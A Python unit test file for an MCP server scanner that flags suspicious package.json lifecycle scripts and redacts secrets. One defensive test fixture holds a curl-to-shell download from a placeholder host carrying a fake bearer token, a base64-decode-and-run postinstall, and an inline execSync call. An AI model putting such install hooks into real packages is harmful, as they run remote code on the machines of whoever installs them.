from __future__ import annotations

import json
import time
import unittest
from pathlib import Path
from tempfile import TemporaryDirectory

from mcp_scanner.package_json_analyzer import analyze_package_json_files
from mcp_scanner.source_inventory import (
    SourceFileRecord,
    SourceInventory,
    collect_source_inventory,
)


class PackageJsonAnalyzerTests(unittest.TestCase):
    def test_benign_mcp_package_json_has_zero_findings_and_detects_framework(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            pkg = {
                "name": "benign-mcp-server",
                "version": "1.0.0",
                "scripts": {
                    "build": "tsc",
                    "prepare": "husky install",
                    "postinstall": "chmod +x dist/index.js",
                    "test": "vitest run",
                },
                "dependencies": {
                    "@modelcontextprotocol/sdk": "^1.12.0",
                    "zod": "^3.23.0",
                },
            }
            (root / "package.json").write_text(json.dumps(pkg, indent=2), encoding="utf-8")
            inv = collect_source_inventory(root)
            res = analyze_package_json_files(inv, server_id="srv:benign")

        self.assertEqual(res.status, "complete")
        self.assertEqual(res.findings, [])
        self.assertEqual(res.frameworks, ["mcp-ts-sdk"])
        self.assertEqual(res.diagnostics, [])

    def test_detects_suspicious_lifecycle_scripts_and_redacts_secrets(self) -> None:
        # Use an in-memory SourceInventory so inert malicious-pattern fixtures never trigger host AV on temp disk.
        pkg = {
            "name": "evil-mcp-pkg",
            "version": "0.0.1",
            "scripts": {
                "preinstall": "curl -fsSL -H 'Authorization: Bearer ghp_1234567890abcdefghijklmnop' https://example.invalid/setup.sh | sh",
                "postinstall": "echo ZGVtbw== | base64 -d | sh",
                "prepare": "node -e 'require(\"child_process\").execSync(\"id\")'",
            },
        }
        raw = json.dumps(pkg, indent=2)
        inv = SourceInventory(
            root=Path("virtual_repo"),
            input_kind="local_directory",
            snapshot_sha256="sha256:0000",
            files=[
                SourceFileRecord(
                    rel_path="package.json",
                    abs_path=Path("virtual_repo/package.json"),
                    language="json",
                    size_bytes=len(raw.encode("utf-8")),
                    sha256="0000",
                    text=raw,
                )
            ],
            files_discovered=1,
        )
        res = analyze_package_json_files(inv, server_id="srv:evil")

        self.assertEqual(res.status, "complete")
        self.assertEqual(len(res.findings), 3)
        by_rule = {f.rule_id: f for f in res.findings}
        self.assertIn("mcp-pkg-lifecycle-download-exec", by_rule)
        self.assertIn("mcp-pkg-lifecycle-obfuscated-exec", by_rule)
        self.assertIn("mcp-pkg-lifecycle-inline-dynamic-exec", by_rule)

        dl = by_rule["mcp-pkg-lifecycle-download-exec"]
        self.assertEqual(dl.category, "supply_chain")
        self.assertEqual(dl.mcp_surface, "A3")
        self.assertEqual(dl.severity, "critical")
        self.assertEqual(dl.owasp_mapping.primary_id, "MCP04:2025")
        self.assertEqual(dl.sink_span.json_pointer, "/scripts/preinstall")
        self.assertIsNotNone(dl.sink_span.start_line)
        self.assertIsNotNone(dl.redacted_evidence)
        self.assertTrue(dl.redacted_evidence.secrets_redacted)
        self.assertNotIn("ghp_1234567890", dl.redacted_evidence.snippet)

    def test_malformed_package_json_returns_partial_without_crashing(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text("{ broken json", encoding="utf-8")
            inv = collect_source_inventory(root)
            res = analyze_package_json_files(inv, server_id="srv:bad")

        self.assertEqual(res.status, "partial")
        self.assertEqual(res.findings, [])
        self.assertEqual(len(res.diagnostics), 1)
        self.assertEqual(res.diagnostics[0]["kind"], "package_json_parse_error")

    def test_benign_buffer_from_base64_without_exec_sink_has_zero_findings(self) -> None:
        pkg = {
            "name": "benign-b64-length",
            "version": "1.0.0",
            "scripts": {
                "prepare": "node -e 'console.log(Buffer.from(\"aGVsbG8=\", \"base64\").length)'",
            },
        }
        raw = json.dumps(pkg, indent=2)
        inv = SourceInventory(
            root=Path("virtual_repo"),
            input_kind="local_directory",
            snapshot_sha256="sha256:0001",
            files=[
                SourceFileRecord(
                    rel_path="package.json",
                    abs_path=Path("virtual_repo/package.json"),
                    language="json",
                    size_bytes=len(raw.encode("utf-8")),
                    sha256="0001",
                    text=raw,
                )
            ],
            files_discovered=1,
        )
        res = analyze_package_json_files(inv, server_id="srv:benign-b64")
        self.assertEqual(res.status, "complete")
        self.assertEqual(res.findings, [])

    def test_no_raw_input_marker_leaks_into_findings_or_diagnostics(self) -> None:
        marker = "DUMMY_VALUE_123"
        good_pkg = json.dumps(
            {
                "name": "marker-pkg",
                "scripts": {
                    "prepare": f"node -e 'console.log(process.env.LANG, \"{marker}\")'",
                },
            },
            indent=2,
        )
        broken_pkg = f'{{"scripts": {{"prepare": "echo {marker}'
        inv = SourceInventory(
            root=Path("virtual_repo"),
            input_kind="local_directory",
            snapshot_sha256="sha256:0002",
            files=[
                SourceFileRecord(
                    rel_path="package.json",
                    abs_path=Path("virtual_repo/package.json"),
                    language="json",
                    size_bytes=len(good_pkg.encode("utf-8")),
                    sha256="0002",
                    text=good_pkg,
                ),
                SourceFileRecord(
                    rel_path="sub/package.json",
                    abs_path=Path("virtual_repo/sub/package.json"),
                    language="json",
                    size_bytes=len(broken_pkg.encode("utf-8")),
                    sha256="0003",
                    text=broken_pkg,
                ),
            ],
            files_discovered=2,
        )
        res = analyze_package_json_files(inv, server_id="srv:marker")
        self.assertEqual(res.status, "partial")
        self.assertEqual(len(res.findings), 1)
        serialized = json.dumps(
            {
                "findings": [f.to_dict() for f in res.findings],
                "diagnostics": res.diagnostics,
            }
        )
        self.assertNotIn(marker, serialized)

    def test_deep_nested_json_and_deadline_return_partial_without_crashing(self) -> None:
        deep_json = "[" * 2000 + "]" * 2000
        inv = SourceInventory(
            root=Path("virtual_repo"),
            input_kind="local_directory",
            snapshot_sha256="sha256:0004",
            files=[
                SourceFileRecord(
                    rel_path="package.json",
                    abs_path=Path("virtual_repo/package.json"),
                    language="json",
                    size_bytes=len(deep_json.encode("utf-8")),
                    sha256="0004",
                    text=deep_json,
                )
            ],
            files_discovered=1,
        )
        res_deep = analyze_package_json_files(inv, server_id="srv:deep")
        self.assertEqual(res_deep.status, "partial")
        self.assertEqual(len(res_deep.diagnostics), 1)
        self.assertEqual(res_deep.diagnostics[0]["kind"], "package_json_parse_error")

        res_timeout = analyze_package_json_files(
            inv, server_id="srv:timeout", deadline=time.monotonic() - 1.0
        )
        self.assertEqual(res_timeout.status, "partial")
        self.assertTrue(any(b.kind == "budget_exceeded" for b in res_timeout.analysis_boundaries))
